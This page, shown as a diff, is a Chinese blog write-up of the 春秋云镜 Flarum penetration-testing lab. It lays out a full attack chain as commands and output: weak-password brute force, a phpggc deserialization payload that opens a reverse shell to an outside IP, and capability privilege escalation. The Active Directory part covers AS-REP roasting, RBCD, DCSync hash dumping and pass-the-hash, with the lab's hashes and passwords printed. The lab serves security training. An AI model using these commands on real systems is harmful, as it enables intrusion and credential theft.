@@ -1,0 +1,364 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜Flarum | P4tt0n's b10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="春秋云镜Flarum第一关 请测试 Flarum 社区后台登录口令的安全性，并获取在该服务器上执行任意命令的能力。  fscan扫描：./fscan -h 39.98.110.249  只开放了22和80端口  找到一片相关文章实战 | 记一次从Flarum开始的RCE之旅 - SecPulse.COM | 安全脉搏 那么现在就是如何登陆后台，题目描述说了是弱口令，用户名为administrato">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜Flarum">
+<meta property="og:url" content="https://p4tt0n.github.io/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum/index.html">
+<meta property="og:site_name" content="P4tt0n's b10g">
+<meta property="og:description" content="春秋云镜Flarum第一关 请测试 Flarum 社区后台登录口令的安全性，并获取在该服务器上执行任意命令的能力。  fscan扫描：./fscan -h 39.98.110.249  只开放了22和80端口  找到一片相关文章实战 | 记一次从Flarum开始的RCE之旅 - SecPulse.COM | 安全脉搏 那么现在就是如何登陆后台，题目描述说了是弱口令，用户名为administrato">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
+<meta property="article:published_time" content="2025-04-25T06:38:19.000Z">
+<meta property="article:modified_time" content="2025-04-25T06:39:00.258Z">
+<meta property="article:author" content="P4tt0n">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜Flarum',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-04-25 14:39:00'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/modify.css"><link rel="stylesheet" href="./themes/butterfly/source/css/transpancy.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's b10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"><span class="site-name">P4tt0n's b10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜Flarum</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-25T06:38:19.000Z" title="发表于 2025-04-25 14:38:19">2025-04-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-25T06:39:00.258Z" title="更新于 2025-04-25 14:39:00">2025-04-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="春秋云镜Flarum"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg');"></div><article class="post-content" id="article-container"><h1 id="春秋云镜Flarum"><a href="#春秋云镜Flarum" class="headerlink" title="春秋云镜Flarum"></a>春秋云镜Flarum</h1><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><blockquote>
+<p>请测试 Flarum 社区后台登录口令的安全性，并获取在该服务器上执行任意命令的能力。</p>
+</blockquote>
+<p>fscan扫描：<code>./fscan -h 39.98.110.249</code></p>
+<p><img src="/2024/07/30/hello-world/mage-20250418121554970.png" alt="image-20250418121554970"></p>
+<p>只开放了22和80端口</p>
+<p><img src="/2024/07/30/hello-world/mage-20250418121718719.png" alt="image-20250418121718719"></p>
+<p>找到一片相关文章<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/185921.html">实战 | 记一次从Flarum开始的RCE之旅 - SecPulse.COM | 安全脉搏</a></p>
+<p>那么现在就是如何登陆后台，题目描述说了是弱口令，用户名为administrator，邮箱为<a href="mailto:administrator@xiaorang.lab">administrator@xiaorang.lab</a></p>
+<p>用rockyou.txt可以爆破到密码1chris</p>
+<p>先下一个<a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc</a>，一种类似于yso但是针对php的反序列化利用工具，这里为了可控文件头，我们使用phpggc来生成tar格式包，里面内容就是反弹shell的命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./phpggc -p tar -b Monolog/RCE6 system "bash -c 'bash -i &gt;&amp; /dev/tcp/8.134.149.24/2333 0&gt;&amp;1'"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20250418122719173.png" alt="image-20250418122719173"></p>
+<p>访问一下<a target="_blank" rel="noopener" href="http://39.98.110.249/assets/forum.css%EF%BC%8C%E5%86%99%E5%85%A5%E6%88%90%E5%8A%9F">http://39.98.110.249/assets/forum.css，写入成功</a></p>
+<p><img src="/2024/07/30/hello-world/mage-20250418123341285.png" alt="image-20250418123341285"></p>
+<p>成功反弹shell</p>
+<p><img src="/2024/07/30/hello-world/mage-20250418123305863.png" alt="image-20250418123305863"></p>
+<p>连上去后flag在root目录，suid提权没法，不过可以capabilities提权，参考下面的文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16026088.html">Linux提权之：利用capabilities提权</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20250418123824036.png" alt="image-20250418123824036"></p>
+<p>用openssl</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">openssl enc -in "/root/flag/flag01.txt"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20250418123905034.png" alt="image-20250418123905034"></p>
+<p><code>ifconfig</code></p>
+<p><img src="/2024/07/30/hello-world/mage-20250418124302473.png" alt="image-20250418124302473"></p>
+<p>扫内网</p>
+<p><code>./fscan -h 172.22.60.0/24</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 端口开放 172.22.60.8:135</span><br><span class="line">[+] 端口开放 172.22.60.8:88</span><br><span class="line">[+] 端口开放 172.22.60.52:80</span><br><span class="line">[+] 端口开放 172.22.60.52:22</span><br><span class="line">[+] 端口开放 172.22.60.42:445</span><br><span class="line">[+] 端口开放 172.22.60.15:445</span><br><span class="line">[+] 端口开放 172.22.60.8:445</span><br><span class="line">[+] 端口开放 172.22.60.42:139</span><br><span class="line">[+] 端口开放 172.22.60.42:135</span><br><span class="line">[+] 端口开放 172.22.60.15:139</span><br><span class="line">[+] 端口开放 172.22.60.8:139</span><br><span class="line">[+] 端口开放 172.22.60.15:135</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.60.42</span><br><span class="line">   [-&gt;] Fileserver</span><br><span class="line">   [-&gt;] 172.22.60.42</span><br><span class="line">   [-&gt;] 169.254.197.25</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.60.15</span><br><span class="line">   [-&gt;] PC1</span><br><span class="line">   [-&gt;] 172.22.60.15</span><br><span class="line">   [-&gt;] 169.254.156.1</span><br><span class="line">[*] NetBios 172.22.60.15    XIAORANG\PC1                  </span><br><span class="line">[*] NetBios 172.22.60.42    XIAORANG\FILESERVER           </span><br><span class="line">[*] NetBios 172.22.60.8     [+] DC:XIAORANG\DC             </span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.60.8</span><br><span class="line">   [-&gt;] DC</span><br><span class="line">   [-&gt;] 172.22.60.8</span><br><span class="line">   [-&gt;] 169.254.32.183</span><br><span class="line">[*] 网站标题 http://172.22.60.52       状态码:200 长度:5867   标题:霄壤社区</span><br></pre></td></tr></tbody></table></figure>
+
+<p>梳理一下</p>
+<blockquote>
+<ul>
+<li>172.22.60.52、外网Flarum服务</li>
+<li>172.22.60.8、XIAORANG\DC</li>
+<li>172.22.60.42、XIAORANG\FILESERVER</li>
+<li>172.22.60.15、XIAORANG\PC1</li>
+</ul>
+</blockquote>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><blockquote>
+<p>请尝试获取内网中Fileserver主机的权限，并发现黑客留下的域控制器后门。</p>
+</blockquote>
+<p>写一个webshell连接蚁剑</p>
+<p><img src="/2024/07/30/hello-world/mage-20250418124634435.png" alt="image-20250418124634435"></p>
+<p>翻到数据库配置</p>
+<p><img src="/2024/07/30/hello-world/mage-20250418125041031.png" alt="image-20250418125041031"></p>
+<p>连接</p>
+<p><img src="/2024/07/30/hello-world/mage-20250418125147302.png" alt="image-20250418125147302"></p>
+<p>找到一个用户名的表，导出</p>
+<p><img src="/2024/07/30/hello-world/mage-20250418125824629.png" alt="image-20250418125824629"></p>
+<p>打AS-REP Roasting</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains impacket-GetNPUsers -dc-ip 172.22.60.8  xiaorang.lab/ -usersfile username.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$krb5asrep$23$zhangxin@XIAORANG.LAB:81dbc1e5a5c7d2858fd878f00e95efab$a6e6b32e5e3d4e3e62e044a0e4659e8f1ba89475bde9cdbaef632f40962a55cedcddc32504be18e9680f4303c49179a8b743377c3500f045c9ec6a33e0e89823c43b299f5c7d765ad4167169b28b4d123978f2b9768a425a02cbe3f553ae8260426c2c403b0f650d21f88ab8fef4bb3f6ee215168fa588c5023104f775f39369d07c6f6e90ef8c3b8cf46904fcbd24e7fa9206070dcdd30dbe8d4a3c59937d066d9a9806bb4138fcc6b8f77d4be1d9bba7895432bc1f8ac1d5418c9429b7222c917b62dcbbbb0831ca819c4f5fcca22522e3fafe2a2e25ff37064ae95a0eca5ea804f14e018a19c9f8571ac0</span><br><span class="line">$krb5asrep$23$wangyun@XIAORANG.LAB:03d39cdc3beba2dd9d8357231ec3067a$878f9ba025ce301b0a66f475a645d0bfd84136d2497e34e9c4c929cfb87909d70e7a54a85a322ab415af3bfb7cf693794fa14c5d1d5ffa4586d9de81267d5fdddef069db02d9f9671193958e4fdacd71541ea6927f1f8bc994d5b348b8435af4f331d9e19a34c576f803736647971ee49e3d20fecea6408accbf27281e034604b3242dbe8536db6feafae96234d43ce7079a3e8c684a134913bc2d4f3b249136dd9f404857edae87c2473c836c87353ad67af0ee08ee30944b3030757a6b6b0cf0110e175b63410f4e501ab0a05e1e3a135f34f518e0f948c21db5f21e4802812433494c8efa660246f1aab4</span><br></pre></td></tr></tbody></table></figure>
+
+<p>得到两个哈希，用john爆破一下</p>
+<p><code>wangyun:Adm12geC</code></p>
+<p>利用这个账号密码做一下信息收集</p>
+<p><img src="/2024/07/30/hello-world/mage-20250418131331462.png" alt="image-20250418131331462"></p>
+<p>发现<a href="mailto:zhangxin@xiaorang.lab">zhangxin@xiaorang.lab</a> 用户属于 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators">Account Operators</a> 组的成员：但是我们现在还登录不了他。</p>
+<p>先看看wangyun能登录哪个主机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q netexec rdp 172.22.60.52/24 -u wangyun -p Adm12geC</span><br><span class="line">RDP         172.22.60.42    3389   Fileserver       [*] Windows 10 or Windows Server 2016 Build 17763 (name:Fileserver) (domain:xiaorang.lab) (nla:True)</span><br><span class="line">RDP         172.22.60.42    3389   Fileserver       [-] xiaorang.lab\wangyun:Adm12geC </span><br><span class="line">RDP         172.22.60.8     3389   DC               [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC) (domain:xiaorang.lab) (nla:True)</span><br><span class="line">RDP         172.22.60.15    3389   PC1              [*] Windows 10 or Windows Server 2016 Build 17763 (name:PC1) (domain:xiaorang.lab) (nla:True)</span><br><span class="line">RDP         172.22.60.8     3389   DC               [+] xiaorang.lab\wangyun:Adm12geC </span><br><span class="line">RDP         172.22.60.15    3389   PC1              [+] xiaorang.lab\wangyun:Adm12geC (Pwn3d!)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用<a href="mailto:wangyun@xiaorang.lab">wangyun@xiaorang.lab</a>\Adm12geC账号rdp上去，发现桌面有一个xshell</p>
+<p>利用<a target="_blank" rel="noopener" href="https://github.com/JDArmy/SharpXDecrypt">SharpXDecrypt.exe</a>这个工具提取xshell存储的密码</p>
+<p><img src="/2024/07/30/hello-world/mage-20250418133233058.png" alt="image-20250418133233058"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">UserName: zhangxin</span><br><span class="line">Password: admin4qwY38cc</span><br></pre></td></tr></tbody></table></figure>
+
+<p>zhangxin用户是ACCOUNT OPERATORS组的，可以打RBCD</p>
+<p>添加机器账号</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q impacket-addcomputer xiaorang.lab/zhangxin:'admin4qwY38cc' -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name 'hacker$' -computer-pass 'Password@973'</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20250418133722423.png" alt="image-20250418133722423"></p>
+<p>修改msDS-AllowedToActOnBehalfOfOtherIdentity</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q impacket-rbcd xiaorang.lab/zhangxin:'admin4qwY38cc' -dc-ip 172.22.60.8 -action write -delegate-to 'Fileserver$' -delegate-from 'hacker$'</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20250418133742664.png" alt="image-20250418133742664"></p>
+<p>申请银票据</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q impacket-getST xiaorang.lab/'hacker$':'Password@973' -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20250418133814002.png" alt="image-20250418133814002"></p>
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_Fileserver.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></tbody></table></figure>
+
+<p>修改host</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">172.22.60.15 PC1.xiaorang.lab</span><br><span class="line">172.22.60.42 FILESERVER.xiaorang.lab</span><br><span class="line">172.22.60.8  XIAORANG\DC</span><br></pre></td></tr></tbody></table></figure>
+
+<p>psexec无密码连上FILESERVER，拿到SYSTEM权限(psexec自带提权效果)</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains impacket-psexec Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20250418134145602.png" alt="image-20250418134145602"></p>
+<p><img src="/2024/07/30/hello-world/mage-20250418134227342.png" alt="image-20250418134227342"></p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><blockquote>
+<p>请尝试利用黑客留下的域控制器后门获取域控的权限。</p>
+</blockquote>
+<p>发现FILESERVER.XIAORANG.LAB有DCSync权限，也就是题目描述里面说到的后门,抓一下FILESERVER的哈希</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q python secretsdump.py -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8</span><br></pre></td></tr></tbody></table></figure>
+
+<p>dump域控哈希</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q python secretsdump.py xiaorang.lab/'Fileserver$':@172.22.60.8 -hashes :951d8a9265dfb652f42e5c8c497d70dc -dc-ip 172.22.60.8 -just-dc-ntlm Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:c3cfdc08527ec4ab6aa3e630e79d349b:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98194d49adfe247020eaade4a3936d95:::chenfang:1105:aad3b435b51404eeaad3b435b51404ee:302b5743b0f7b3436591aedf550ded5b:::zhanghao:1106:aad3b435b51404eeaad3b435b51404ee:4c37e7a022daf856bfa2b16824696ab5:::wangyun:1107:aad3b435b51404eeaad3b435b51404ee:561d64b9a1c943db32810fb5586a4be9:::zhangwei:1108:aad3b435b51404eeaad3b435b51404ee:3d2f864635abb31f2546dc07cbcd2528:::wangkai:1109:aad3b435b51404eeaad3b435b51404ee:d20a47a4529552805d96a24c3020384c:::yangyan:1110:aad3b435b51404eeaad3b435b51404ee:4f80f967fd586f4212bc264a7d1f6789:::zhangxin:1111:aad3b435b51404eeaad3b435b51404ee:38780e101b28bb9b9036fc3e2e4f35e6:::wangping:1112:aad3b435b51404eeaad3b435b51404ee:0adf6fb0f808be95d449e3b6c67b02dc:::DC$:1000:aad3b435b51404eeaad3b435b51404ee:ea1a6058127a1d322ced63b59b6d92e5:::PC1$:1103:aad3b435b51404eeaad3b435b51404ee:57eb8022770c8fb3adadaee4d62c313b:::FILESERVER$:1114:aad3b435b51404eeaad3b435b51404ee:951d8a9265dfb652f42e5c8c497d70dc:::hacker$:1116:aad3b435b51404eeaad3b435b51404ee:ad123012e39b20a80ebe424bff56e1b4:::[*] Cleaning up... </span><br></pre></td></tr></tbody></table></figure>
+
+<p>PTH</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q impacket-wmiexec -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/administrator@172.22.60.8 -codec gbk</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20250418135237633.png" alt="image-20250418135237633"></p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><blockquote>
+<p>通过kerberos攻击的获取域内权限，并进行信息收集。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q impacket-wmiexec -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/administrator@172.22.60.15 -codec gbk</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/image-20250418135317112.png" alt="image-20250418135317112"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io">P4tt0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum/">https://p4tt0n.github.io/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://p4tt0n.github.io" target="_blank">P4tt0n's b10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CSpoofing/" title="春秋云镜Spoofing"><div class="cover" style="background: 